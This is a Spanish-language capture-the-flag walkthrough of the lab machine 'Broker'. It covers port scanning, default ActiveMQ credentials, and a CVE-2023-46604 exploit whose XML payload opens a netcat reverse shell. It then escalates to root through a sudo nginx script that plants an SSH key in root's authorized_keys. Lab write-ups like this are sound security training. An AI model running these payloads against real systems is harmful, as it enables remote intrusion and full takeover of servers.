# Resolución maquina broker

**Autor:** PepeMaquina  
**Fecha:** 15 de octubre de 2025  
**Dificultad:** Easy  
**Sistema Operativo:** Linux  
**Tags:** MQTT, CVE, exploits.

---
## Imagen de la Máquina
![](broker.jpg)
*Imagen: broker.JPG*
## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.243 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,80,1883,5672,8161,32877,61613,61614,61616 10.10.11.243 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
|_mqtt-subscribe: Failed to receive control packet from server.
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
32877/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.95%I=7%D=10/15%Time=68EFFA9D%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10
SF:\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x0
SF:1\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cl
SF:ient\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,"A
SF:MQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa
SF:1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x
SF:02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x
SF:20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0\0
SF:AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0
SF:`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:
SF:decode-error\xa17Connection\x20from\x20client\x20using\x20unsupported\x
SF:20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0
SF:\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x
SF:02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17C
SF:onnection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempte
SF:d")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19
SF:\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0
SF:\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connect
SF:ion\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(
SF:DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\
SF:0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x
SF:18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20
SF:from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSess
SF:ionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc
SF:0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0
SF:S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20clien
SF:t\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCookie
SF:,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\
SF:x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\
SF:xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20u
SF:sing\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.95%I=7%D=10/15%Time=68EFFA98%P=x86_64-pc-linux-gnu%r(
SF:HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STOM
SF:P\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Protoc
SF:olException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apach
SF:e\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Proto
SF:colConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.sto
SF:mp\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\n\
SF:tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\(T
SF:ransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\.t
SF:cp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apache\
SF:.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\)\
SF:n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
### Enumeracion de nombre del dominio
Haciendo un análisis rápido, se puede ver que corre un servidor mqtt, normalmente esto es para dispositivos IoT, esto suele correr en el puerto 1883, pero inspeccionando parece que el broker que utiliza es "activeMQ", revisando la página web, se puede ver que pide unas credenciales y probando credenciales básicas se prueba "admin:admin" y redirige a la interfaz del broker.
![](broker2.jpg)
Se puede ver que nos otorga la versión, por lo que se busca alguna vulnerabilidad para esta versión.

### CVE-2023-46604
Al revisar vulnerabilidades, se encontró un CVE que ejecuta un RCE, por lo que buscando se encontró un repositorio (https://github.com/X1r0z/ActiveMQ-RCE), por lo que replicando este.
Primero se modificó la poc.xml con una reverse shell.
~~~bash
cat poc.xml            
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>busybox nc 10.10.x.x 4433 -e /bin/bash</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
~~~
Justo despues, se abrió un servidor con la "poc.xml" desde la maquina atacante.
~~~ bash
python3 -m http.server 8080
~~~
Al mismo tiempo, se ejecuta el exploit.
~~~bash
go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.17:8080/poc.xml
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.10.11.243:61616
[*] XML URL: http://10.10.x.x:8080/poc.xml

[*] Sending packet: 000000721f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001f687474703a2f2f31302e31302e31342e31373a383038302f706f632e786d6c
~~~
Con ello se deberia ver una petición desde el servidor que se abrió
~~~bash
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.243 - - [15/Oct/2025 17:36:24] "GET /poc.xml HTTP/1.1" 200 -
10.10.11.243 - - [15/Oct/2025 17:36:24] "GET /poc.xml HTTP/1.1" 200 -
~~~
Adicionalmente configurar un escucha para recibir la reverse shell.
~~~bash
sudo nc -nlvp 4433                                                                    
[sudo] password for kali: 
listening on [any] 4433 ...
connect to [10.10.x.x] from (UNKNOWN) [10.10.11.243] 59998
id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
~~~

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`
### User Flag
Con esto ya se puede ver la user flag
~~~
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cd 
activemq@broker:~$ ls
user.txt
activemq@broker:~$ cat user.txt 
<Encuentre su propia usre flag>
~~~

---
## Escalada de Privilegios
Se realizó la enumeración básica, colocando el comando "sudo -l" donde es encontró con un servicio que puede ser ejecutado.
~~~bash
activemq@broker:/$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
~~~
Visto esto, existe un exploit para aprovechar este permiso, una explicación clara se puede ver en esta página (https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406), el exploit trata basicamente en crear un nuevo id_rsa mediante nginx y pasarlo al .ssh de la carpeta root, asi que replicandolo.
Primero se copia y pega el exploit en la ruta base del usurio activemq
~~~bash
activemq@broker:~$ cat exp.sh
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
~~~
Luego darle permisos de ejecución y ejecutarlo, esto creara la nueva conexión ssh y la pasara al /root
~~~bash
activemq@broker:~$ chmod +x exp.sh 
activemq@broker:~$ ./exp.sh 
[+] Creating configuration...
[+] Loading configuration...
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
nginx: [emerg] still could not bind()
[+] Generating SSH Key...
Generating public/private rsa key pair.
Enter file in which to save the key (/home/activemq/.ssh/id_rsa): 
/home/activemq/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/activemq/.ssh/id_rsa
Your public key has been saved in /home/activemq/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:GG+aJvIP3k3waGgoC1vp2yRY0/+DyrwNDTxvHR0Hrmk activemq@broker
The key's randomart image is:
+---[RSA 3072]----+
|          .      |
|         . .     |
|      .   o .    |
|   o   + + o     |
|  o = o E .      |
| o + B X .       |
|+ * B @.+        |
|.* @ X.+.        |
|o o.O++ o.       |
+----[SHA256]-----+
[+] Display SSH Private Key for copy...
-----BEGIN OPENSSH PRIVATE KEY-----
b3<SNIP>Aw==
-----END OPENSSH PRIVATE KEY-----
[+] Add key to root user...
[+] Use the SSH key to get access
~~~
Con esto se puede copiar el id_rsa y conectarse mediante ello.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Copiando el id_rsa a la maquina atacante, solo es cosa de modificar los permisos y entrar como root.
~~~bash
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.243
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 15 10:06:57 PM UTC 2025

  System load:           0.11962890625
  Usage of /:            70.9% of 4.63GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             160
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.243
  IPv6 address for eth0: dead:beef::250:56ff:fe94:588c

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@broker:~# cd /root/
root@broker:~# ls
cleanup.sh  root.txt
root@broker:~# cat root.txt
<Encuentre su propia root flag>
~~~
De esa forma, se logro obtener la root flag.
🎉 Sistema completamente comprometido - Root obtenido

